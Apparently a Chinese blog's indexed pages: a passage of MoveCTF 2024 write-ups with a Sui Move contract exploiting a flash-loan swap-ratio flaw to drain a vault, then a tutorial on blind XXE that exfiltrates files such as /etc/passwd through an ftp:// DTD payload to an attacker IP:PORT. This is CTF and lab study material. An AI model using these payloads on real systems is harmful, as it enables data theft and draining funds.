count_4。\nup函数使用动态规划根据输入参数m和n计算一个值。它使用一个向量的向量构建一个值的矩阵，并从矩阵的最后一行的最后一个元素中检索所需的值。\n让ai将up函数用python重写然后本地跑一下的到两组数据，3-169和5-89。 通过execute函数去赋值（数字m和n传递时要转换成十六进制）。然后调用get_flag即可。\nSwap sorce: 200\n题目源码：\nmodule swap::vault{ use sui::coin::{Self, Coin}; use sui::tx_context::{Self, TxContext}; use sui::balance::{Self, Balance}; use sui::object::{Self, ID, UID}; use sui::transfer; use sui::event; use swap::ctfa::{Self, MintA}; use swap::ctfb::{Self, MintB}; struct Vault\u0026lt;phantom A, phantom B\u0026gt; has key { id: UID, coin_a: Balance\u0026lt;A\u0026gt;, coin_b: Balance\u0026lt;B\u0026gt;, flashed: bool } struct Flag has copy, drop { win: bool, sender: address } struct Receipt { id: ID, a_to_b: bool, repay_amount: u64 } public entry fun initialize\u0026lt;A,B\u0026gt;(capa: MintA\u0026lt;A\u0026gt;, capb: MintB\u0026lt;B\u0026gt;,ctx: \u0026amp;mut TxContext) { let vault = Vault\u0026lt;A, B\u0026gt; { id: object::new(ctx), coin_a: coin::into_balance(ctfa::mint_for_vault(capa, ctx)), coin_b: coin::into_balance(ctfb::mint_for_vault(capb, ctx)), flashed: false }; transfer::share_object(vault); } public fun flash\u0026lt;A,B\u0026gt;(vault: \u0026amp;mut Vault\u0026lt;A,B\u0026gt;, amount: u64, a_to_b: bool, ctx: \u0026amp;mut TxContext): (Coin\u0026lt;A\u0026gt;, Coin\u0026lt;B\u0026gt;, Receipt) { assert!(!vault.flashed, 1); let (coin_a, coin_b) = if (a_to_b) { (coin::zero\u0026lt;A\u0026gt;(ctx), coin::from_balance(balance::split(\u0026amp;mut vault.coin_b, amount ), ctx)) } else { (coin::from_balance(balance::split(\u0026amp;mut vault.coin_a, amount ), ctx), coin::zero\u0026lt;B\u0026gt;(ctx)) }; let receipt = Receipt { id: object::id(vault), a_to_b, repay_amount: amount }; vault.flashed = true; (coin_a, coin_b, receipt) } public fun repay_flash\u0026lt;A,B\u0026gt;(vault: \u0026amp;mut Vault\u0026lt;A,B\u0026gt;, coina: Coin\u0026lt;A\u0026gt;, coinb: Coin\u0026lt;B\u0026gt;, receipt: Receipt) { let Receipt { id: _, a_to_b: a2b, repay_amount: amount } = receipt; if (a2b) { assert!(coin::value(\u0026amp;coinb) \u0026gt;= amount, 0); } else { assert!(coin::value(\u0026amp;coina) \u0026gt;= amount, 1); }; balance::join(\u0026amp;mut vault.coin_a, coin::into_balance(coina)); balance::join(\u0026amp;mut vault.coin_b, coin::into_balance(coinb)); vault.flashed = false; } public fun swap_a_to_b\u0026lt;A,B\u0026gt;(vault: \u0026amp;mut Vault\u0026lt;A,B\u0026gt;, coina:Coin\u0026lt;A\u0026gt;, ctx: \u0026amp;mut TxContext): Coin\u0026lt;B\u0026gt; { let amount_out_B = coin::value(\u0026amp;coina) * balance::value(\u0026amp;vault.coin_b) / balance::value(\u0026amp;vault.coin_a); coin::put\u0026lt;A\u0026gt;(\u0026amp;mut vault.coin_a, coina); coin::take(\u0026amp;mut vault.coin_b, amount_out_B, ctx) } public fun swap_b_to_a\u0026lt;A,B\u0026gt;(vault: \u0026amp;mut Vault\u0026lt;A,B\u0026gt;, coinb:Coin\u0026lt;B\u0026gt;, ctx: \u0026amp;mut TxContext): Coin\u0026lt;A\u0026gt; { let amount_out_A = coin::value(\u0026amp;coinb) * balance::value(\u0026amp;vault.coin_a) / balance::value(\u0026amp;vault.coin_b); coin::put\u0026lt;B\u0026gt;(\u0026amp;mut vault.coin_b, coinb); coin::take(\u0026amp;mut vault.coin_a, amount_out_A, ctx) } public fun get_flag\u0026lt;A,B\u0026gt;(vault: \u0026amp;Vault\u0026lt;A,B\u0026gt;, ctx: \u0026amp;TxContext) { assert!( balance::value(\u0026amp;vault.coin_a) == 0 \u0026amp;\u0026amp; balance::value(\u0026amp;vault.coin_b) == 0, 123 ); event::emit( Flag { win: true, sender: tx_context::sender(ctx) } ); } } ctfa和ctfb中定义了两种货币，不是重点，就不放源码了。\n提供了闪电贷和两种货币相互兑换的功能。\n介绍一下闪电贷 源码中Receipt作为欠条，在用户贷款时发送给用户，由于其没有drop能力，所以交易结束之前如果没有被解包就会报错导致交易失败。 repay_flash函数可以解包receipt。这就意味着贷款的借出和归还只能在一笔交易中进行，就是让你借出去拿这些钱去套利，然后马上还回来，如果不换或者换的不够交易就失败，这笔交易就不会写入链上。\n题解 由于定义了vault.flashed变量，所以我们只能一次借一种货币且在未还清之前不能再借，所以我们要先将vault中某一种货币清空，再把另一种货币借空，然后调用get_flag，然后再还钱就可以了。\nswap_a_to_b和swap_b_to_a可以将两种货币相互兑换，兑换时按照比例进行兑换，但问题在于，兑换的比率没有考虑贷款。以swap_a_to_b为例：\npublic fun swap_a_to_b\u0026lt;A,B\u0026gt;(vault: \u0026amp;mut Vault\u0026lt;A,B\u0026gt;, coina:Coin\u0026lt;A\u0026gt;, ctx: \u0026amp;mut TxContext): Coin\u0026lt;B\u0026gt; { // 传参vault为银行，coina为我们的A货币 let amount_out_B = coin::value(\u0026amp;coina) * balance::value(\u0026amp;vault.coin_b) / balance::value(\u0026amp;vault.coin_a); // 计算出可以兑换的B的数量，这里只考虑了vault内的余量，没有加上我们已经贷出去的。 coin::put\u0026lt;A\u0026gt;(\u0026amp;mut vault.coin_a, coina); coin::take(\u0026amp;mut vault.coin_b, amount_out_B, ctx) } vault中初始有A,B各100个，攻击者初始拥有A,B各10个。\n我先借90个A 在用10个A去换B，此时vault中 B/A = 10 ,所以10个A可以还100个B。 在把90个A还回去。 通过这三步操作，我们手上拥有110个B（10个本来拥有+vault中的100个）和0个A（10A换成了B）。而且此时所有的欠款均已还清。 最后在把vault中的110个A借出来就可以了。 攻击合约: module zoiltin_solve_swap::exp{ use sui::coin::{Self,Coin}; use sui::tx_context::{Self,TxContext}; use sui::transfer; use sui::balance::{Self}; use swap::vault::{Self,Receipt}; public entry fun exp\u0026lt;A,B\u0026gt;(bank: \u0026amp;mut vault::Vault\u0026lt;A,B\u0026gt;,my_coin_a: Coin\u0026lt;A\u0026gt;,ctx: \u0026amp;mut TxContext){ // 传参带进来vault和我们初始的10个A let (coin_a_1,coin_b_1,receipt_1) = vault::flash\u0026lt;A,B\u0026gt;(bank,90,false,ctx); // 借90个A let coin_b_swap = vault::swap_a_to_b\u0026lt;A,B\u0026gt;(bank,my_coin_a,ctx); // 10A个换成B assert!(coin::value(\u0026amp;coin_b_swap) == 100, 12); // 换出来的B的数量是否等于100 transfer::public_transfer(coin_b_swap,tx_context::sender(ctx)); // 将100个B传递到我们的地址上 vault::repay_flash\u0026lt;A,B\u0026gt;(bank,coin_a_1,coin_b_1,receipt_1); // 还债90个A let (coin_a_2,coin_b_2,receipt_2) = vault::flash\u0026lt;A,B\u0026gt;(bank,110,false,ctx); // 再借110个A assert!(coin::value(\u0026amp;coin_a_2) == 110, 11); // 第二次借出来A的数量是否等于110 vault::get_flag\u0026lt;A,B\u0026gt;(bank,ctx); // 拿flag vault::repay_flash\u0026lt;A,B\u0026gt;(bank,coin_a_2,coin_b_2,receipt_2); // 还钱110A } } 部署攻击合约 这部分也该提一下，网上的资料基本都是英文的。\n#首先创建一个新的包 sui move new zoiltin_solve_swap #文件结构如下： #zoiltin_solve_swap/ #| /sources/ #| | exp.move #| /Move.toml Move.toml内容如下：\n[package] name = \u0026#34;zoiltin_solve_swap\u0026#34; version = \u0026#34;0.0.1\u0026#34; [dependencies] Sui = { git = \u0026#34;https://github.com/MystenLabs/sui.git\u0026#34;, subdir = \u0026#34;crates/sui-framework/packages/sui-framework\u0026#34;, rev = \u0026#34;framework/testnet\u0026#34; } # Sui = { local = \u0026#34;/opt/sui/crates/sui-framework/packages/sui-framework\u0026#34; } swap = { local = \u0026#34;../swap\u0026#34; } [addresses] zoiltin_solve_swap = \u0026#34;0x0\u0026#34; swap = \u0026#34;package_id\u0026#34; sui = \u0026#34;0x2\u0026#34; addresses里面：0x0代表此包尚未发布，意思就是这次要发布的包。如果已经发布了就像题目中的swap包就写这个包的package_id以及在published-at里写上package_id\ndependencies放源代码路径。\nswap源码里的Move.toml文件也要改：\n[package] name = \u0026#34;swap\u0026#34; version = \u0026#34;0.0.1\u0026#34; published-at = \u0026#34;package_id\u0026#34; [dependencies] Sui = { git = \u0026#34;https://github.com/MystenLabs/sui.git\u0026#34;, subdir = \u0026#34;crates/sui-framework/packages/sui-framework\u0026#34;, rev = \u0026#34;framework/testnet\u0026#34; } # Sui = { local = \u0026#34;/opt/sui/crates/sui-framework/packages/sui-framework\u0026#34; } [addresses] swap = \u0026#34;package_id\u0026#34; 在攻击合约目录下执行以下代码来发布包\nsui client publish --with-unpublished-dependencies --skip-dependency-verification --gas-budget 1000000000 可以查看CTFA和CTFB两个泛型的地址。 CTFA和CTFB为题目定义的两种币，\u0026ndash;type-args要传入CTFA和CTFB作为泛型。\n先调用vault里的initiate函数来初始化A,B个10个币。\n然后调用攻击合约中的exp函数.sui client call --package \u0026lt;攻击合约的package_id\u0026gt; --module exp --function exp --type-args \u0026lt;\u0026lt;CTFA的详细地址\u0026gt;,\u0026lt;CTFB的详细地址\u0026gt;\u0026gt; --args \u0026lt;那两个参数\u0026gt; --gas-budget 10000000\nEasyGame 源码：\npublic fun submit_solution(user_input: vector\u0026lt;u64\u0026gt;,rc: \u0026amp;mut Challenge,ctx: \u0026amp;mut TxContext ){ let sender = sui::tx_context::sender(ctx); let houses = rc.initial_part; vector::append(\u0026amp;mut houses, user_input); let amount_robbed = rob(\u0026amp;houses); let result = amount_robbed == rc.target_amount; if (result) { event::emit(Flag { user: sender, flag: true }); }; } public fun rob(houses: \u0026amp;vector\u0026lt;u64\u0026gt;):u64{ let n = vector::length(houses); if (n ==0){ 0; }; let v = vector::empty\u0026lt;u64\u0026gt;(); vector::push_back(\u0026amp;mut v, *vector::borrow(houses, 0)); if (n\u0026gt;1){ vector::push_back(\u0026amp;mut v, math::max(*vector::borrow(houses, 0), *vector::borrow(houses, 1))); }; let i = 2; while (i \u0026lt; n) { let dp_i_1 = *vector::borrow(\u0026amp;v, i - 1); let dp_i_2_plus_house = *vector::borrow(\u0026amp;v, i - 2) + *vector::borrow(houses, i); vector::push_back(\u0026amp;mut v, math::max(dp_i_1, dp_i_2_plus_house)); i = i + 1; } ; *vector::borrow(\u0026amp;v, n - 1) } house初始值为[1,2,4,5,1,3,6,7]，需要我们在house后追加一些数据是rob函数返回22。 rob函数是用动态规划计算在不抢劫相邻房屋的情况下如何利益最大，发现添加一个数字9就可以。\n攻击合约 module zoiltin_solve_easy_game::exp{ use std::vector; use sui::tx_context::TxContext; use easygame::easy_game::{Self,Challenge}; public entry fun exp(rc: \u0026amp;mut Challenge,ctx: \u0026amp;mut TxContext){ let payload = vector::empty\u0026lt;u64\u0026gt;(); vector::push_back(\u0026amp;mut payload,9); easy_game::submit_solution(payload,rc,ctx); } } Kitchen sorce: 200\n题目关键源码：\npublic fun cook(olive_oils: vector\u0026lt;Olive_oil\u0026gt;, yeast: vector\u0026lt;Yeast\u0026gt;, flour: vector\u0026lt;Flour\u0026gt;, salt: vector\u0026lt;Salt\u0026gt;, status: \u0026amp;mut Status) { let l1 = vector::length\u0026lt;Olive_oil\u0026gt;(\u0026amp;olive_oils); let l2 = vector::length\u0026lt;Yeast\u0026gt;(\u0026amp;yeast); let l3 = vector::length\u0026lt;Flour\u0026gt;(\u0026amp;flour); let l4 = vector::length\u0026lt;Salt\u0026gt;(\u0026amp;salt); let cook1 = Cook {source : vector::empty\u0026lt;Olive_oil\u0026gt;()}; let cook2 = Cook {source : vector::empty\u0026lt;Yeast\u0026gt;()}; let cook3 = Cook {source : vector::empty\u0026lt;Flour\u0026gt;()}; let cook4 = Cook {source : vector::empty\u0026lt;Salt\u0026gt;()}; let i = 0; while(i \u0026lt; l1) { vector::push_back(\u0026amp;mut cook1.source, *vector::borrow(\u0026amp;olive_oils, i)); i = i + 1; }; i = 0; while(i \u0026lt; l2) { vector::push_back(\u0026amp;mut cook2.source, *vector::borrow(\u0026amp;yeast, i)); i = i + 1; }; i = 0; while(i \u0026lt; l3) { vector::push_back(\u0026amp;mut cook3.source, *vector::borrow(\u0026amp;flour, i)); i = i + 1; }; i = 0; while(i \u0026lt; l4) { vector::push_back(\u0026amp;mut cook4.source, *vector::borrow(\u0026amp;salt, i)); i = i + 1; }; let p = Pizza { olive_oils: cook1, yeast: cook2, flour: cook3, salt: cook4, }; assert!( bcs::to_bytes(\u0026amp;p) == x\u0026#34;0415a5b8a6f8c946bb0300bd9d997eb7038ad784faf2b802c5f122e1\u0026#34;, 0); status.status1 = true; } public fun recook (out: vector\u0026lt;u8\u0026gt;, status: \u0026amp;mut Status) { let p = Pizza { olive_oils: Cook\u0026lt;Olive_oil\u0026gt; { source: vector\u0026lt;Olive_oil\u0026gt;[ get_Olive_oil(0xb9d9), get_Olive_oil(0xeb54), get_Olive_oil(0x9268), get_Olive_oil(0xc5f7), get_Olive_oil(0xa1ec), get_Olive_oil(0xd084), ] }, yeast: Cook\u0026lt;Yeast\u0026gt; { source: vector\u0026lt;Yeast\u0026gt;[ get_Yeast(0xbd00), get_Yeast(0xfc81), get_Yeast(0x999d), get_Yeast(0xb77e), ] }, flour: Cook\u0026lt;Flour\u0026gt; { source: vector\u0026lt;Flour\u0026gt;[ get_Flour(0xdcc7), get_Flour(0xcc7a), get_Flour(0x8f19), get_Flour(0x96b1), get_Flour(0x8a6d), ] }, salt: Cook\u0026lt;Salt\u0026gt; { source: vector\u0026lt;Salt\u0026gt;[ get_Salt(0x8b01), get_Salt(0xf1c5), get_Salt(0xc6ec), ] }, }; assert!( bcs::to_bytes(\u0026amp;p) == out, 0); status.status2 = true; } 需要让这两个函数返回true。涉及到序列化。\n先看cook函数 cook函数要我们传入一个配方对象，然后比较序列化后是否与x\u0026quot;0415a5b8a6f8c946bb0300bd9d997eb7038ad784faf2b802c5f122e1\u0026quot;相等。\nBinary Canonical Serialization, BCS, 是在 Diem 区块链项目中开发出来的序列化格式，现在也被广泛应用于大部分基于 Move 的区块链，比如Sui, Starcoin, Aptos, 0L. 除了在 Move VM 虚拟机中使用，BCS也被用在交易 transaction 和事件 event 编码中，比如在签署交易之前做序列化处理，解析事件数据。 相关资料：https://intro-zh.sui-book.com/advanced-topics/BCS_encoding/lessons/BCS_%E7%BC%96%E7%A0%81.html\n查阅资料得知：\nBCS是一种数据序列化格式，其生成的输出字节不包含任何类型信息。因此，接收编码字节的一方需要知道如何反序列化数据\nBCS 中没有数据类型，当然也没有结构体 structs; struct 只是定义了内部字段 fields 被序列化的顺序\n感觉这个c语言中的序列化比较相似，c语言中的将结构体从内存中写入二进制文件时就是直接原封不动把内存写入文件。而数据格式全靠程序员自定义。\n看下面这个例子便于理解：\nstruct Metadata has drop, copy { name: std::ascii::String } struct BCSObject has drop, copy { id: ID, owner: address, meta: Metadata } let (id, owner, meta) = ( bcs::peel_address(\u0026amp;mut bcs), bcs::peel_address(\u0026amp;mut bcs), bcs::peel_vec_u8(\u0026amp;mut bcs) ); 反序列化meta时使用的格式是vector\u0026lt;u8\u0026gt;（8位整数数组，就是std::ascii::String的格式），也就是说序列化时直接忽略了Metadata结构体，直接把对象从内存中转储成字节。\n然后再看题目中的结构，以Olive_oil为例，其他四种食材都一样：\nstruct Olive_oil has copy, drop, store {amount: u16} struct Pizza has copy, drop, store { olive_oils: Cook\u0026lt;Olive_oil\u0026gt;, yeast: Cook\u0026lt;Yeast\u0026gt;, flour: Cook\u0026lt;Flour\u0026gt;, salt: Cook\u0026lt;Salt\u0026gt;, } struct Cook\u0026lt;T\u0026gt; has copy, drop, store { source: vector\u0026lt;T\u0026gt; } Pizza中的olive_oils实际上是一个16位整数的数组，外面套了两层结构体。由于bcs的序列化格式，Pizza的序列化数据为：\n数组长度 数据 数组长度 数据 \u0026hellip;. 0x4 0x1 0x2 0x3 0x4 0x3 0x1 0x2 0x3 \u0026hellip;. 使用以下python脚本解析：\ndata = \u0026#39;0415a5b8a6f8c946bb0300bd9d997eb7038ad784faf2b802c5f122e1\u0026#39; i = 0 bytes_s = [] while i \u0026lt; len(data) - 1: bytes_s.append(int(\u0026#39;0x\u0026#39; + data[i] + data[i+1],16)) i = i+ 2 res = [] i = 0 p = 0 while i \u0026lt; len(bytes_s): p = bytes_s[i] i = i + 1 l = [] for o in range(p): l.append(\u0026#39;0x\u0026#39; + hex(bytes_s[i+1]).replace(\u0026#34;0x\u0026#34;,\u0026#34;\u0026#34;) + hex(bytes_s[i]).replace(\u0026#34;0x\u0026#34;,\u0026#34;\u0026#34;)) i = i + 2 res.append(l) print(res) 可能是因为反码补码那一套东西，我发现2字节的数字（16位）需要倒换一下才行。 通过得到的数据生成对象即可。\nrecook函数： recook函数就简单许多了。 已经把数据都写出来了，直接生成序列化数据传参即可。\n攻击合约 module zoiltin_solve_kitchen::exp{ use sui::tx_context::{TxContext}; use sui::bcs; use sui::event; use std::vector; use kitchen::kitchen::{Self,Olive_oil,Yeast,Flour,Salt}; struct Poil has drop{ p1:vector\u0026lt;u16\u0026gt;, p2:vector\u0026lt;u16\u0026gt;, p3:vector\u0026lt;u16\u0026gt;, p4:vector\u0026lt;u16\u0026gt; } struct Message has drop,copy{ mass:vector\u0026lt;u8\u0026gt; } public entry fun exp(ctx: \u0026amp;mut TxContext) { let obj1 = Poil{ p1:vector\u0026lt;u16\u0026gt;[0xa515,0xa6b8,0xc9f8,0xbb46], p2:vector\u0026lt;u16\u0026gt;[0xbd00,0x999d,0xb77e], p3:vector\u0026lt;u16\u0026gt;[0xd78a,0xfa84,0xb8f2], p4:vector\u0026lt;u16\u0026gt;[0xf1c5,0xe122] }; // cook需要的相应数据。 let statu = kitchen::get_status(ctx); let l1 = 4; let l2 = 3; let l3 = 3; let l4 = 2; let cook1 = vector::empty\u0026lt;Olive_oil\u0026gt;(); let cook2 = vector::empty\u0026lt;Yeast\u0026gt;(); let cook3 = vector::empty\u0026lt;Flour\u0026gt;(); let cook4 = vector::empty\u0026lt;Salt\u0026gt;(); // 通过数据生成所需的对象。 let i = 0; while(i \u0026lt; l1) { vector::push_back(\u0026amp;mut cook1, kitchen::get_Olive_oil((*vector::borrow(\u0026amp;obj1.p1, i) as u16))); i = i + 1; }; i = 0; while(i \u0026lt; l2) { vector::push_back(\u0026amp;mut cook2, kitchen::get_Yeast((*vector::borrow(\u0026amp;obj1.p2, i) as u16))); i = i + 1; }; i = 0; while(i \u0026lt; l3) { vector::push_back(\u0026amp;mut cook3, kitchen::get_Flour((*vector::borrow(\u0026amp;obj1.p3, i) as u16))); i = i + 1; }; i = 0; while(i \u0026lt; l4) { vector::push_back(\u0026amp;mut cook4, kitchen::get_Salt((*vector::borrow(\u0026amp;obj1.p4, i) as u16))); i = i + 1; }; // event::emit( Message{ // mass: bcs::to_bytes(\u0026amp;obj1) // } ); // assert!( bcs::to_bytes(\u0026amp;obj1) == x\u0026#34;04a515a6b8c9f8bb4603bd00999db77e03d78afa84b8f202f1c5e122\u0026#34;, 999); kitchen::cook(cook1,cook2,cook3,cook4,\u0026amp;mut statu); let obj2 = Poil{ p1:vector\u0026lt;u16\u0026gt;[ 0xb9d9, 0xeb54, 0x9268, 0xc5f7, 0xa1ec, 0xd084 ], p2:vector\u0026lt;u16\u0026gt;[ 0xbd00, 0xfc81, 0x999d, 0xb77e ], p3:vector\u0026lt;u16\u0026gt;[ 0xdcc7, 0xcc7a, 0x8f19, 0x96b1, 0x8a6d ], p4:vector\u0026lt;u16\u0026gt;[ 0x8b01, 0xf1c5, 0xc6ec ] }; // 这里通过自定义的Poil结构生成序列化字节，因为bcs特点，只要他们在内存中存储格式一样，无论结构体名或嵌套了几层都无所谓。最后生成的序列化字节都是一样的。 kitchen::recook(bcs::to_bytes(\u0026amp;obj2),\u0026amp;mut statu); kitchen::get_flag(\u0026amp;statu,ctx); } } 网上关于bcs的资料很少，搜到的bcs的第三方解析库也都不能成功解析，不过还好题目的数据不算复杂，自己写的脚本也能用。\nsubset sorce: 400 (未解决)\n题目源码：\nmodule subset::subset_sum { use sui::event; use sui::tx_context; use std::vector; struct Flag has copy, drop { user: address } struct Status has store, drop { status1: bool, status2: bool, status3: bool, user: address } const SUBSET1: vector\u0026lt;u256\u0026gt; = vector\u0026lt;u256\u0026gt;[1, 2, 3, 4, 5]; const SUBSET1_k: u256 = 3; const SUBSET1_SUM: u256 = 10; const SUBSET2: vector\u0026lt;u256\u0026gt; = vector\u0026lt;u256\u0026gt;[657114161599166, 910496114410022, 688072175280628, 979125688929861, 785338725553848, 887159728265050, 622841641193103, 725154659875148, 740423950361799, 1112663190822550, 922195312967936, 1042436852643560, 794233930466363, 1005209504277475, 1095553790921575, 1100234031975913, 1097338706315892, 685173186787942, 931084447948631, 1025208692464347, 823246835986875, 640705587553065, 1067772094848338, 608307547370178, 860527574463312, 745522896700102, 1107646656429468, 575719789023353, 1008988042757401, 563072788255737, 882855688862943, 974319745991702, 1004427379286462, 904504413493231, 1083652042079152, 1053694822809090, 702717128907262, 881540236795119, 992204188883575, 890965906483327]; const SUBSET2_k: u256 = 5; const SUBSET2_SUM: u256 = 4178919802453692; const SUBSET3: vector\u0026lt;u256\u0026gt; = vector\u0026lt;u256\u0026gt;[730983191275949878802706287425, 738747747182330870358722868390, 680758618870742741205069880873, 736839950200009681117675478653, 821817898783913524938769447793, 1062662929594640521216588473346, 804078432654564652353003934418, 987354119502628442223858924307, 974121064863569224403070119631, 766517359152261667697388282513, 1115664590742545309936719501477, 1254953696369781959586392455121, 708965201854329468418120106125, 803407590419087414384275360152, 680994772249007776444211943134, 1209641410992728376967530103489, 1022807828605992586908433214193, 708760513774702586605766399361, 1146510154260900723919247238072, 1071639493717448858831225830703, 704595551001390485227577881300, 666267842956106233584633761922, 916484600070887410197321230180, 869547011380359879465486127051, 1146284238922586539801525899580, 960791406315307372223215677265, 846714517434965788941098273736, 943109174072029103168835446476, 1186748483275224241752870865835, 810729587696497173434925395865, 1081140748486010470135469081647, 1117896979087650487375387404086, 815335940196924955981808193550, 980088874723074134145795909695, 1040350471929604504671667297293, 694306413856033832104987821225, 1100701148915109260220219397362, 861206885233154419043148976517, 876554683816312162465230697586, 1076923686440478606439365136720, 1107602068170190810465822909560, 1100902219684950305811682891430, 1009332208289062882998661101012, 967609782575367058780528699819, 847083579140405861838133952519, 960959937086001625649028920079, 705904760596273528708773247739, 988488072940508411593301577206, 855813607361058850034718734435, 923433147009426548286155351544, 927267999331166226154541562801, 833421857490492247367663980146, 913726313126985248790906682414, 1152739002690744639089937932044, 758241923243582267541395815418, 826183630101084916296521382931, 871183653161711616458012031543, 1118876419859306653014740242503, 925209067093127804911661688602, 796047972746266882548343051358, 1105317347573296959936900839504, 1032520332923337088078820581073, 790503191621237284611596729403, 1093888060891270134787133219999, 1129244151204837429536515955111, 736340764546413369555890340882, 844331877762673816004189096610, 1216403448409604941009786692773, 1026707098397380044704009977063, 1162146257113640418035057534747, 1239108677717284719224289951413, 1179642728157883101738427519029, 1121726694197132350252978011382, 1166236995314127503915531123371, 1237380820841327126465021125310, 928563984604088646801945637827, 969172329973162874760566309613, 916791337778690807774047076043, 1187392146940862931565053344747, 1041354841046252194695344517944]; const SUBSET3_k: u256 = 10; const SUBSET3_SUM: u256 = 9639405868465735216305592265916; public fun get_status(ctx: \u0026amp;mut tx_context::TxContext): Status { Status { status1: false, status2: false, status3: false, user: tx_context::sender(ctx) } } public fun check_params(vec: vector\u0026lt;u256\u0026gt;, k: u256) { let i = 0; let sum: u256 = 0; while(i \u0026lt; vector::length(\u0026amp;vec)) { assert!(*vector::borrow(\u0026amp;vec, i) == 1 || *vector::borrow(\u0026amp;vec, i) == 0, 0); sum = sum + *vector::borrow(\u0026amp;vec, i); i = i + 1; }; assert!(sum == k, 0); } public fun solve_subset1(vec: vector\u0026lt;u256\u0026gt;, status: \u0026amp;mut Status) { let i = 0; let sum: u256 = 0; while(i \u0026lt; vector::length(\u0026amp;SUBSET1)) { sum = sum + (*vector::borrow(\u0026amp;vec, i) * *vector::borrow(\u0026amp;SUBSET1, i)); i = i + 1; }; assert!(SUBSET1_SUM == sum, 0); check_params(vec, SUBSET1_k); status.status1 = true; } public fun solve_subset2(vec: vector\u0026lt;u256\u0026gt;, status: \u0026amp;mut Status) { let i = 0; let sum: u256 = 0; while(i \u0026lt; vector::length(\u0026amp;SUBSET2)) { sum = sum + (*vector::borrow(\u0026amp;vec, i) * *vector::borrow(\u0026amp;SUBSET2, i)); i = i + 1; }; assert!(SUBSET2_SUM == sum, 0); check_params(vec, SUBSET2_k); status.status2 = true; } public fun solve_subset3(vec: vector\u0026lt;u256\u0026gt;, status: \u0026amp;mut Status) { let i = 0; let sum: u256 = 0; while(i \u0026lt; vector::length(\u0026amp;SUBSET3)) { sum = sum + (*vector::borrow(\u0026amp;vec, i) * *vector::borrow(\u0026amp;SUBSET3, i)); i = i + 1; }; assert!(SUBSET3_SUM == sum, 0); check_params(vec, SUBSET3_k); status.status3 = true; } public fun get_flag(status: \u0026amp;Status, ctx: \u0026amp;mut tx_context::TxContext) { let user = tx_context::sender(ctx); assert!(status.user == user, 0); assert!(status.status1 \u0026amp;\u0026amp; status.status2 \u0026amp;\u0026amp; status.status3, 0); event::emit(Flag { user: user }); } } 从subset中找到一个长度为subset_k的子集，其元素之和等于subset_sum。 有三个子问题：solve_subset1，solve_subset2和solve_subset3。 请教re大佬后拿到的脚本：\ndef find_subset_sum(subset, subset_k, subset_sum): # 导入必要的库 from itertools import combinations # 遍历subset中所有可能的k元组合 for combination in combinations(subset, subset_k): # 如果组合的元素之和等于subset_sum，则返回组合 if sum(combination) == subset_sum: return combination # 如果找不到满足条件的组合，则返回None return None # 定义输入 subset = [1,2,3,4,5] subset_k = 3 subset_sum = 10 # 调用函数查找满足条件的组合 result = find_subset_sum(subset, subset_k, subset_sum) # 打印结果 if result: print(\u0026#34;找到满足条件的组合:\u0026#34;) print(result) else: print(\u0026#34;找不到满足条件的组合\u0026#34;) 第一组：(1, 4, 5) 第二组：(725154659875148, 685173186787942, 1025208692464347, 860527574463312, 882855688862943) 第三组跑不出来啦~~~~~~~~~~~\n参考 https://intro-zh.sui-book.com/ https://docs.sui.io/concepts/sui-move-concepts\n","permalink":"https://zoiltin.github.io/posts/movectf-2024-wp/","summary":"Checkin sorce:100\n题目源码:\nmodule movectf::checkin { use sui::event; use sui::tx_context::{Self, TxContext}; const ESTRING:u64 = 0; struct Flag has copy, drop { sender: address, flag: bool, } public entry fun get_flag(string: vector\u0026lt;u8\u0026gt;, ctx: \u0026amp;mut TxContext) { assert!(string == b\u0026#34;MoveBitCTF\u0026#34;,ESTRING); event::emit(Flag { sender: tx_context::sender(ctx), flag: true, }); } } 带着MoveBitCTF字符串作为参数调用get_flag函数。传参要用字节。\n# 转换为十六进制 print(\u0026#34;0x\u0026#34;) for i in \u0026#34;MoveBitCTF\u0026#34;: print(hex(ord(i)).replace(\u0026#34;0x\u0026#34;,\u0026#34;\u0026#34;),end=\u0026#34;\u0026#34;) 调用即可：\nsui client call --package package_id --module module_name --function get_flag --args 0x4d6f7665426974435446 --gas-budget 10000000 DynamicMatrixTraversal sorce: 200","title":"movectf_2024_wp"},{"content":"本篇文章仅用于技术交流学习和研究的目的，严禁使用文章中的技术用于非法目的和破坏。\n关于盲XXE的文件读取 盲XXE想要读取文件一般来说需要外带。但是如果文件中包含换行等特殊字符，直接http外带，会报无效url错误。 在php环境下，可以直接使用php伪协议中的filter进行编码转换，就不会报错了。 但在java环境下或者禁用filter的情况下，可以尝试用ftp://协议外带。\n环境 这里使用的环境是Hello-Java-Sec的靶场环境 https://github.com/j3ers3/Hello-Java-Sec/\njdk8 漏洞代码： DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); DocumentBuilder builder = factory.newDocumentBuilder(); // 这里其实有回显，偷懒不改代码了，假装看不见。 原理 使用ftp://协议可以带出带有换行的数据。 （可利用版本：jdk\u0026lt;7u141和jdk\u0026lt;8u162，高于这两个版本ftp://协议也不能用了。）\n正常的ftp服务器不能满足我们的需要，但我从网上找到的模拟ftp服务器都不能用（也可能是我不会用），于是就自己写了一个。 链接：https://github.com/zoiltin/fake-ftp-server\n写脚本之前，先了解一下调用ftp://协议是发生了什么。通过读取/etc/passwd为例，payload：ftp://ip:port/{data}数据交互如下： 蓝色的为fake-ftp-server。 建立连接和确定模式后，服务器开始发送CWD指令，因为在/etc/passwd中有许多/将数据分割为许多目录，所以服务器一直尝试切换目录。我们要做的就是接受并不断返回250 Directory successfully changed.让服务器一直传数据。 在最后一个/后的数据，服务器将其视为要下载的文件名，请求用被动模式下载数据，从流量中可见，攻击者开启63568端口并告诉服务器，当服务器连接63568端口后，即向我们发送了要下载的文件名也就是最后一段数据。\nftp://协议比较简单，脚本很容易实现。\n用法 payload:\n\u0026lt;!ENTITY % file SYSTEM \u0026#34;file://\u0026#34;\u0026gt; \u0026lt;!ENTITY % int \u0026#34;\u0026lt;!ENTITY \u0026amp;#37; send SYSTEM \u0026#39;ftp://IP:PORT/%file;\u0026#39;\u0026gt;\u0026#34;\u0026gt; 简单的用法： ftp://IP:PORT/%file; 或者全用CWD读取： ftp://IP:PORT/%file;/ 数据中不能包含%和#，如果有'或\u0026quot;需要调整evil.dtd中包裹ftp://的引号类型，不然会报错。?和#会导致数据截断。\n在高版本也可以十分有限的利用：\nftp://username:%file;@IP:PORT/asdasd 将数据从密码处传递，只能读一行 如果文件有多行会报错，回显一部分。 